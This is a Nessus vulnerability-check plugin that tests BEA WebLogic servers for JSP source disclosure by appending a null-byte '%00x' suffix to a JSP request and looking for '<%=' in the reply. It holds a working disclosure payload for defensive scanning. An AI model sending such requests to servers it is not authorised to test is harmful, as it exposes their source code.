#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# and is based on BEA_weblogic_Reveal_source_code.nasl
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{

script_id(10949);
script_xref(name:"OSVDB", value:"49368");

script_version("$Revision: 1.21 $");
# script_cve_id("CVE-MAP-NOMATCH");
# NOTE: no CVE id assigned (jfs, december 2003)

script_name(english:"BEA WebLogic Null Byte Request JSP Source Disclosure");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"BEA WebLogic may be tricked into revealing the source code of JSP
scripts by adding an encoded character (%00x) at the end of the
request." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2002-04/0411.html" );
 script_set_attribute(attribute:"solution", value:
"Use the official patch available at http://www.bea.com or upgrade to a
version newer than 6.1SP2." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


summary["english"]="BEA WebLogic may be tricked into revealing the source code of JSP scripts.";
script_summary(english:summary["english"]);

script_category(ACT_GATHER_INFO);

script_copyright(english:"This script is (C) 2002-2009 Tenable Network Security, Inc.");

family["english"]="CGI abuses";
script_family(english:family["english"]);

script_dependencie("find_service1.nasl", "http_version.nasl", "webmirror.nasl");
 
script_require_ports("Services/www", 80);

exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function check(req, port)
{ 
  local_var r, response, signature;

  r = http_send_recv3(method:"GET", item:req, port:port); 
  if (isnull(r)) return NULL;
  response = strcat(r[0], r[1], '\r\n', r[2]);
  #signature of Jsp.
  signature = "<%=";

  if (signature >< response) return response;

  return NULL;
}

port = get_http_port(default:80);


if(!get_port_state(port)) exit(0);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "WebLogic" >!< sig ) exit(0);


# Try with a known jsp file

files = get_kb_list(string("www/", port, "/content/extensions/jsp"));
if(isnull(files)) {
	if ( get_kb_item("Services/www/" + port + "/embedded") ) exit(0);
	file = "/index.jsp";
	}
else
 {
 files = make_list(files);
 file = files[0];
 }

poison = string(file, "%00x");
res = check(req:poison, port:port);
if (res)
{
  # Unless we're paranoid, make sure the string doesn't normally appear.
  if (report_paranoia < 2 && check(req:file, port:port)) exit(0);

  if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to exploit the issue using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:poison), "\n"
      );
      if (report_verbosity > 1)
      {
        report = string(
          report,
          "\n",
          "Here is the JSP source uncovered :\n",
          "\n",
          res
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
}
 
